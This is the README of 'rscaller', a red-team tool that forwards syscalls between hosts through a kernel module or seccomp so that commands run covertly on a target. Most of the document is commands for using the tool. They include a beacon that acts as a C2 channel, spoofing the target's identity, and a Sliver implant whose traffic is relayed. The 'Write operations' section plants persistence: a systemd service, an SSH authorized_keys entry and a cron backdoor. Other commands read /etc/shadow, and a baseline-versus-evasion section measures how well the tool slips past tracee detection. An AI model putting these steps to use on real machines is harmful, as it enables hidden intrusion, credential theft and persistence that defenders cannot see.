# rscaller

Syscall forwarding for red team research. Two modes:

**Mode A (kmod):** Victim syscalls → Attacker execution (transparent intercept via kernel module)
**Mode B (rsc):** Attacker commands → Victim execution (remote shell via seccomp + rscfuse)

## Architecture

### Mode A: Victim → Attacker (kmod-based)

```
 ┌─────────────────────────── victim VM ──────────────────────────────┐
 │  process                                                            │
 │    │  syscall(execve, ...)                                          │
 │    ▼                                                                │
 │  kmod (khook)                                                       │
 │    │  intercept → serialize → ControlBuffer                        │
 │    │                          /proc/rscaller                        │
 │    │                          rsclient → TCP →                      │
 │    │                               │                                │
 └────┼───────────────────────────────┼────────────────────────────────┘
      │                               │
      │  TCP/TLS                      │
      └──────────────────────────────►│  attacker: rsbeacon
                                       │    libc::syscall() → local exec
```

## Quick Start: Mode B (seccomp, no kmod)

**dev-vm-1** is the attacker/client that runs `rsc`. **dev-vm-2** hosts `rsbeacon`.

```bash
# 1. Build on dev-vm-1 and push rsbeacon to dev-vm-2
make deploy-all

# 2. On dev-vm-2: start beacon (done automatically by test fixtures or manually)
ssh dev-vm-2 "sudo /home/ubuntu/rsbeacon --listen 192.0.2.1:9999"

# 3. On dev-vm-1: open a shell with syscalls forwarded to dev-vm-2
ssh dev-vm-1
sudo rsc shell --beacon 0.0.0.0:9999 --name default
# → /rsc/default/ is a FUSE mount of dev-vm-2's filesystem
# → syscalls from the shell execute on dev-vm-2
```

**No kernel module required** — Mode B uses `SECCOMP_RET_USER_NOTIF` for interception.

---

For a realistic test, run kmod + rsclient on **dev-vm-rscaller** (victim),
rsbeacon on the dev host (or a separate attacker VM), and clone the victim
as **dev-vm-rscaller-victim** for a clean target.

## Repository layout

```
rscaller/
├── rsc/                   attacker-side CLI (seccomp + rscfuse launcher)
│   ├── profiles/          built-in mount profiles (YAML, embedded at compile time)
│   │   ├── base.yaml          shared parent: common mounts + network syscalls
│   │   ├── none.yaml          no overlay, baseline local execution
│   │   ├── recon.yaml         read-only beacon discovery (/proc, /sys)
│   │   ├── recon-routed.yaml  recon + network routing policy
│   │   ├── shadow.yaml        beacon impersonation (/proc, /sys, /etc identity)
│   │   ├── shadow-routed.yaml shadow + network routing policy
│   │   ├── beacon-local.yaml  red team: beacon identity, targets REMOTE, C2 LOCAL
│   │   ├── ghost.yaml         merged local+beacon /proc, kill forwarding
│   │   ├── relay.yaml         network relay only, no FS overlay
│   │   └── qemu-relay.yaml    run inside local QEMU VM, beacon block device
│   └── src/
│       ├── main.rs        subcommands: exec, shell, fuse, deploy
│       ├── exec.rs        seccomp/kmod/relay dispatch logic
│       └── mount_config.rs profile loading + mount namespace application
├── rscfuse/               FUSE filesystem library (embedded in rsc; `rsc fuse`)
├── rsbeacon/              syscall executor daemon (runs on beacon host)
│   └── src/
│       ├── main.rs        CLI: --listen, --tls, --tls-cert/key
│       ├── server.rs      TCP / TLS accept loop
│       └── executor.rs    raw libc::syscall() dispatch + blocklist
├── rsclient/              syscall relay (spawned by rsc; not invoked directly)
│   └── src/
│       ├── relay.rs       seccomp unotify poller + beacon I/O
│       └── kmod.rs        kmod ring-buffer poller (Mode A only)
├── qemu-vdw-core/         QEMU relay: libvirt provisioning + guest-agent exec
├── kmod/                  kernel module (khook-based, Mode A only)
├── rscaller-proto/        shared Rust crate (types, codec, transport)
├── ctls/                  controller abstraction + seccomp/kmod backends
├── tools/codegen/         tracefs → syscall metadata codegen (kmod handlers)
├── docs/                  architecture, syscall matrix, design docs (see docs/README.md)
├── docker/
│   └── rsc.Dockerfile     Ubuntu 22.04 + Rust + fuse3 + binaries
└── scripts/
    ├── deploy.sh          rsync source to REMOTE + remote cargo build
    ├── bootstrap.sh       idempotent dev-VM provisioning (packages, libvirt, fuse)
    ├── poc.sh             manual PoC: rsbeacon + tracee + rsc exec in one shot
    └── gen_certs.sh       generate self-signed TLS certs
```

## Prerequisites

**Victim VM:**
- Linux kernel headers matching the running kernel (`linux-headers-$(uname -r)`)
- `gcc`, `make`, `git`
- khook submodule (init'd during `make deploy` or manually via `git submodule update --init lib/khook`)

**Attacker / dev host:**
- Rust stable (`rustup` install)
- `cargo` in `$PATH`
- `openssl` if generating TLS certs

**Evasion testing (`scripts/test_evasion_baseline.sh`):**
- Attacker VM (`dev-vm-rscaller`): `fuse3`, `libfuse3-dev` — required for `rscfuse` mount
- Victim VM (`dev-vm-rscaller-clone`): Docker — `poc.sh` runs [`tracee`](https://github.com/aquasecurity/tracee) in a privileged container (`aquasec/tracee:latest`)
- Enum tools (fetched at runtime): [`lse.sh`](https://github.com/diego-treitos/linux-smart-enumeration) (default, fast) or [`linpeas`](https://github.com/carlospolop/PEASS-ng)

## Build

Default: `make` builds Rust workspace (no kmod). Use `make configure` for kmod setup.

```bash
# Quick build (attacker-side binaries)
make

# Or with Docker (produces portable binaries)
docker build -t rsc:latest -f docker/rsc.Dockerfile .
```

### Kmod build (Mode A only)

```bash
make configure   # Generate headers + build kmod + Rust
make kmod        # Just the kernel module
```

## Deploy

Default remote host is `dev-vm-rscaller` (SSH alias). Override with `REMOTE=<host>`.

```bash
# Install build deps on victim VM
make setup-remote REMOTE=dev-vm-rscaller

# Rsync repo + build kmod + build Rust workspace on victim VM
make deploy REMOTE=dev-vm-rscaller
```

`deploy.sh` excludes `.git/`, `target/`, kmod object files, and `certs/`.
khook is initialized on the remote after sync.

## Run

### Mode B — seccomp (default, no kmod)

**dev-vm-2 (beacon host):**
```bash
sudo /home/ubuntu/rsbeacon --listen 192.0.2.1:9999
```

**dev-vm-1 (rsc client):**
```bash
# Run a single command with syscalls forwarded to dev-vm-2
sudo rsc exec --beacon 0.0.0.0:9999 --name default -- /bin/ls /

# Interactive shell
sudo rsc shell --beacon 0.0.0.0:9999 --name default
# → /rsc/default/ mirrors dev-vm-2's filesystem via FUSE
```

### Mode A — kmod (legacy, opt-in)

**Attacker host:**
```bash
./target/release/rsbeacon --listen 0.0.0.0:9999
```

**Victim VM (kmod loaded):**
```bash
cd /home/ubuntu/rscaller/kmod && sudo insmod rscaller.ko
sudo /home/ubuntu/rscaller/target/release/rsclient \
  --beacon <attacker-ip>:9999 \
  --proc-path /proc/rscaller
```

### TLS

```bash
bash scripts/gen_certs.sh certs/
sudo rsbeacon --listen 192.0.2.1:9999 --tls --tls-cert certs/server.crt --tls-key certs/server.key
sudo rsc shell --beacon 0.0.0.0:9999 --encryption tls --ca-cert certs/ca.crt
```

## Configurable Make variables

| Variable | Default | Purpose |
|---|---|---|
| `REMOTE` | `dev-vm-1` | Build host — rsync source + `cargo build` runs here |
| `BEACON_VM` | `dev-vm-2` | Beacon host — receives `rsbeacon` binary via scp from REMOTE |
| `BEACON_PORT` | `9999` | Beacon port |
| `BEACON_SNAPSHOT` | `baseline` | Snapshot name for `snapshot-beacon` |
| `VM_SNAPSHOT` | `clean-base-docker-nokmod` | Snapshot name for `snapshot-create/restore` |

Examples:
```bash
make deploy-all                          # build on dev-vm-1, scp rsbeacon to dev-vm-2
make test-vm                             # deploy-all + run full pytest suite
make test-vm NO_DEPLOY=1                 # run tests against existing build
make snapshot-beacon                     # snapshot dev-vm-2 after deploy-beacon
```

## Mount namespace overlay profiles

`rsc exec --mount-profile <name>` creates a private mount namespace and bind-mounts
a FUSE proxy over selected paths.  Both reads AND writes on overlaid paths go through
rscfuse to the beacon — no remote execution, just transparent file I/O redirection.

| Profile    | Overlaid paths                                              | What it fakes                         |
|------------|-------------------------------------------------------------|---------------------------------------|
| `none`     | (none)                                                      | local execution, no overlay           |
| `recon`    | `/proc`, `/sys`                                             | beacon network state, routing tables, NIC MACs (read-only, no forwarding) |
| `shadow`   | `/proc`, `/sys`, `/etc/hostname`, `/etc/hosts`, `/etc/machine-id`, `/etc/os-release`, `/etc/lsb-release` | beacon identity + network forwarded through beacon |
| `ghost`    | `/proc` (merged: local + beacon), `/mnt/target → /`        | beacon process table visible via `ps`/`kill`; signals forwarded to beacon |
| `relay`    | (none)                                                      | network syscalls forwarded, no FS overlay |
| `qemu-relay` | (none)                                                  | command runs inside a local QEMU VM with the beacon's block device attached |

`recon-routed`, `shadow-routed`, `beacon-local` are the above plus a network
routing policy (see `docs/design/NETWORK_ROUTING.md`). `base` is the shared
parent profile, not meant for direct use.

### Proof commands per profile

```bash
# recon — beacon IP appears in its own routing table but not on the client
sudo rsc exec --beacon <beacon>:9999 --mount-profile recon \
  -- grep <beacon_ip> /proc/net/fib_trie

# recon — beacon NIC MAC
sudo rsc exec --beacon <beacon>:9999 --mount-profile recon \
  -- grep . /sys/class/net/enp1s0/address

# shadow — hostname/machine-id read from beacon via FUSE
sudo rsc exec --beacon <beacon>:9999 --mount-profile shadow -- hostname
sudo rsc exec --beacon <beacon>:9999 --mount-profile shadow -- cat /etc/machine-id

# ghost — beacon kernel version, merged process table, signal forwarding
sudo rsc exec --beacon <beacon>:9999 --mount-profile ghost -- cat /proc/version
sudo rsc exec --beacon <beacon>:9999 --mount-profile ghost -- bash -c \
  'ps aux | grep -E "^root\s+100[0-9]{5}"'    # beacon PIDs at offset +10M
sudo rsc exec --beacon <beacon>:9999 --mount-profile ghost -- bash -c \
  'kill -0 10000001 && echo "kill forwarded to beacon pid 1"'
```

### Ghost profile: beacon process control

The `ghost` profile gives a session a view of the beacon's process table
alongside local processes, with signal forwarding to the beacon.

**How it works:**

- `/proc` is a **merged FUSE view**: local PIDs appear as-is; beacon PIDs appear at
  offset `+10,000,000` (e.g. beacon PID 42 → local PID `10000042`).
- `kill(10000042, sig)` is intercepted by seccomp-unotify, the offset is stripped,
  and `kill(42, sig)` is forwarded to the beacon.  Signals to PIDs inside the
  session's own cgroup execute locally.
- `/mnt/target` exposes the beacon's full rootfs read/write.

**Starting the ghost profile (two-VM setup):**

```bash
# One-shot: start rsbeacon, open ghost shell, split tmux pane with beacon observer
bash scripts/ghost-shell.sh

# Teardown
bash scripts/ghost-shell.sh --teardown
```

Or manually:

```bash
# 1. Deploy binaries (builds on dev-vm-1, copies rsbeacon to dev-vm-2)
make deploy-all

# 2. Start rsbeacon on dev-vm-2
ssh dev-vm-2 'sudo pkill rsbeacon 2>/dev/null; sudo /home/ubuntu/rsbeacon \
  --listen 0.0.0.0:9999 >/tmp/rsbeacon.log 2>&1 &'

# 3. Open a ghost shell on dev-vm-1
ssh dev-vm-1
sudo /home/ubuntu/rscaller/target/release/rsc shell \
  --beacon 192.168.122.180:9999 \
  --name ghost \
  --mount-profile ghost

# Inside the ghost shell:
cat /proc/version                    # → beacon kernel version string
ls /proc | wc -l                     # → total entries: local + beacon PIDs
ps aux | awk '$2 > 10000000'         # → beacon processes only
kill -0 10000001                     # → forwarded to beacon PID 1 (init)
ls /mnt/target/etc/hostname          # → beacon's /etc/hostname via FUSE
```

**Beacon PID offset:** `BEACON_PID_OFFSET = 10_000_000`.  PIDs below the offset
are local; at or above it are beacon PIDs with the offset stripped on signal relay.
The offset is defined in `rscfuse/src/procfs.rs` and `rsclient/src/relay.rs`.

### Custom profiles & inheritance

Built-in profiles live in `rsc/profiles/*.yaml` and are embedded at compile time.

#### Using extends: for DRY profiles

All scenario profiles extend `base`, which provides common mounts and network syscalls.
Create custom profiles by extending `base`:

```yaml
name: my-pivot
extends: base
description: "Internal pivoting: access multiple segments via beacon"

forward:
  - name: custom-routing
    syscalls: [socket, connect, bind, listen, accept4, sendto, recvfrom, sendmsg, recvmsg, getsockopt, setsockopt]
    filter:
      net_routes:
        - subnet: "192.168.1.0/24"
          direction: REMOTE
        - subnet: "10.0.0.0/8"
          direction: REMOTE
        - subnet: "0.0.0.0/0"
          direction: LOCAL
```

Save to `~/.config/rsc/profiles/my-pivot.yaml` or `/etc/rsc/profiles/my-pivot.yaml`, then:

```bash
sudo rsc exec --mount-profile my-pivot --beacon host:9999 -- cmd
```

#### Scenario profiles with network routing

- **`beacon-local`**: Red team scenario — beacon's identity + selective routing (target REMOTE, C2/internet LOCAL)
- **`recon-routed`**: Reconnaissance — beacon's network visible in /proc + optional routing

Use with `--route` CLI args to customize network forwarding:

```bash
sudo rsc exec --beacon host:9999 \
  --mount-profile beacon-local \
  --route "192.168.1.0/24=remote" \
  --route "0.0.0.0/0=local" \
  -- ./beacon
```

See `docs/design/NETWORK_ROUTING.md` for complete routing policy and examples.

### Write operations

**Overlaid paths are fully bidirectional.** If `/etc/hostname` is in the profile, writing
to it edits the beacon's file directly — no local copy is created.

```bash
# With shadow profile active inside rsc exec -- bash:
echo "newhostname" > /etc/hostname        # → written on beacon
echo "192.168.1.5 target" >> /etc/hosts  # → appended on beacon
```

**`/mnt/target/` — beacon FS anchor** (`ghost` profile): The full beacon filesystem
is exposed read/write at `/mnt/target/`. Use it for paths not covered by the static overlay:

```bash
# Drop a systemd service on the beacon:
cp myservice.service /mnt/target/etc/systemd/system/
systemctl --root=/mnt/target enable myservice   # or just symlink manually

# Add an authorized key:
mkdir -p /mnt/target/home/ubuntu/.ssh
cat id_rsa.pub >> /mnt/target/home/ubuntu/.ssh/authorized_keys

# Plant a cron job:
echo "* * * * * /tmp/.bd" > /mnt/target/etc/cron.d/persistence
```

**`/home/` and `/root/` stay local by design.** The shadow profile overlays
specific `/etc` identity files but leaves home directories untouched — your working
directory, shell history, SSH keys, and local tools remain on the attacker machine.
To write to the beacon's home directory, use `/mnt/target/home/ubuntu/` explicitly.

### What NOT to overlay

Never add these paths to a profile — they break local tooling:

| Path | Why |
|------|-----|
| `/etc/ld.so.cache`, `/etc/ld.so.conf` | Library resolution — all binaries stop loading |
| `/etc/passwd`, `/etc/group`, `/etc/shadow` | uid/gid resolution — process ownership breaks |
| `/etc/fstab` | Mount config — filesystem setup breaks |
| `/etc/ssl/` | TLS cert store — HTTPS from within the session breaks |
| `/etc/resolv.conf` | DNS — breaks if beacon's nameservers unreachable from client |
| `/sys/fs/cgroup` | Container runtime — resource limits stop working |
| `/sys/kernel/security` | AppArmor/SELinux — mandatory access control breaks |
| `/home/`, `/root/` | Working directory — keep local (history, keys, tools) |

The `shadow` profile overlays **individual files** within `/etc`, not all
of `/etc` — this is intentional to avoid the above breakage.

### Caveats

**Netlink bypasses the overlay.** `ip addr`, `ip link`, `ip route`, `ss` use RTNETLINK
sockets to query the kernel directly — they bypass `/proc` and `/sys` entirely.
They always show the **local** machine's state regardless of profile.
Read raw files to verify the overlay is active:

```bash
grep . /proc/net/fib_trie               # beacon IPs (if /proc overlaid)
cat /sys/class/net/enp1s0/address       # beacon MAC (if /sys overlaid)
cat /etc/machine-id                     # beacon machine-id (if shadow profile)
```

**`/sys` symlinks require full `/sys` overlay.** `/sys/class/net/enp1s0` is a symlink
to `../../devices/.../net/enp1s0`. If only `/sys/class/net/` is mounted, following
the symlink escapes the FUSE tree into the local `/sys/devices/`, defeating the overlay.
The built-in profiles mount all of `/sys` so symlinks stay within the FUSE tree.

**Dead FUSE mounts survive daemon kill.** If rscfuse is killed, its mount point remains
in `/proc/mounts`. Use `umount -l` (lazy detach) to clean up.
Never use `umount -f` — it is for NFS only and silently fails on FUSE mounts.

```bash
grep rsc-profiles /proc/mounts | awk '{print $2}' | xargs -r sudo umount -l
```

### Manual PoC from CLI

Start rsbeacon + tracee on the beacon, run `rsc exec` on the client, show events — all in one command:

```bash
make poc                                       # proc profile (default)
make poc PROFILE=shadow CMD=hostname
make poc PROFILE=shadow CMD="cat /etc/machine-id"
make poc PROFILE=recon CMD="grep . /sys/class/net/enp1s0/address"
make poc-notracee PROFILE=recon                 # skip tracee, 3s faster

# Or directly:
bash scripts/poc.sh --help
bash scripts/poc.sh --profile shadow --cmd "cat /etc/machine-id"
bash scripts/poc.sh --profile shadow --no-tracee --beacon dev-vm-2 --client dev-vm-1
```

Tracee (eBPF) runs on the beacon and watches `execve`/`execveat`.
**Zero events = command executed locally**, data came from beacon via FUSE.

### Baseline-vs-evasion comparison

`poc.sh` can also run a command twice — once directly on the beacon (baseline,
no rscaller) and once via `rsc exec` (evasion) — under two separate tracee
capture windows, then print matching-event counts for both and a PASS/FAIL
verdict. Tracee `--events` and the event-matching `--query` are both
configurable (`--query` matches against `processName`, `eventName`, and any
event arg, case-insensitive, OR of comma-separated substrings).

Three ready-made scenarios (`--scenario exec|file|network`):

```bash
make poc-scenario SCENARIO=exec      # cat /etc/shadow — execve/execveat
make poc-scenario SCENARIO=file      # plant a cron.d entry — file-write events
make poc-scenario SCENARIO=network   # curl-download linpeas.sh — socket/DNS/TCP/UDP events

# 2-pane tmux window (rsclient | rsbeacon) for screenshotting a run:
make poc-scenario-tmux SCENARIO=network
```

Or build your own comparison directly:

```bash
bash scripts/poc.sh --compare --profile ghost \
  --cmd "cat /mnt/target/etc/shadow" \
  --baseline-cmd "cat /etc/shadow" \
  --events execve,execveat --query cat

# equivalently:
make poc-compare PROFILE=ghost CMD="cat /mnt/target/etc/shadow" \
  BASELINE_CMD="cat /etc/shadow" QUERY=cat
```

See `bash scripts/poc.sh --help` for the full flag list.

## Test

```bash
# Unit + integration tests (no VM)
make test

# Local integration tests: codegen, beacon roundtrip, codec
make integration-tests

# Full VM E2E suite (seccomp + rscfuse, dev-vm-1 + dev-vm-2)
make test-vm

# Skip deploy if VMs already have a fresh build
make test-vm NO_DEPLOY=1

# TLS roundtrip
bash scripts/gen_certs.sh certs/
cargo test -p rscaller-proto -- --ignored test_tls_roundtrip
```

## Adding forwarded syscalls

1. Add the syscall name to `files/forwarded_syscalls`.
2. Add parameter metadata to `hardcoded_syscall_metadata()` in `tools/codegen/src/codegen.rs`.
3. `make handlers` to regenerate `kmod/handler_wrappers.h` and `kmod/syscalls.c`.
4. `make kmod` to rebuild the module.

Parameter metadata specifies C type (int, char*, void*, …), size, and which argument
index is the buffer argument (used for copying userspace strings into kernel buffers).

## Sliver session test

Topology for a realistic test:

```
dev host (attacker)          dev-vm-rscaller (victim, kmod loaded)
  rsbeacon :9999      ◄────  rsclient → /proc/rscaller
  sliver server       ◄────  sliver implant (running on victim)
```

Clone `dev-vm-rscaller` as `dev-vm-rscaller-victim` to get an identical
snapshot as the actual target. On victim:

```bash
# Load kmod
sudo insmod rscaller.ko

# Point rsclient at attacker's beacon
sudo rsclient --beacon <attacker>:9999

# Drop a Sliver implant and execute it
./sliver-implant  # any execve, open, kill will be forwarded
```

On the attacker side, rsbeacon receives `SyscallRequest { number=59 (execve), args=[...] }`
and executes it locally. The victim process blocks until rsbeacon returns the retval.
The implant's syscalls transparently run on the attacker machine — C2 traffic
appears to originate from the attacker's own process table.

## Protocol

```
wire format: [u32 LE length][bincode-encoded payload]

SyscallRequest  { slot_idx: u64, number: u64, args: [u64; 6],
                  in_bufs: Vec<SyscallBuf>, out_sizes: Vec<(u8, u64)> }
SyscallResponse { slot_idx: u64, ret: i64, out_bufs: Vec<SyscallBuf> }
```

Full field semantics: `docs/ARCHITECTURE.md` → "Wire Protocol".

`slot_idx` correlates requests with responses and maps back to the kmod ring buffer
slot so the kernel completion fires on the right waiter.

## Blocked syscalls (beacon-side)

`rsbeacon` refuses: `reboot(169)`, `init_module(175)`, `delete_module(176)`,
`pivot_root(155)`, `umount2(166)`. Returns `-EPERM`. Extend `BLOCKED_SYSCALLS` in
`rsbeacon/src/executor.rs`.


## References

https://github.com/PatrickBuhagiar/Remote-File-Memory-Mapping - remote mmap
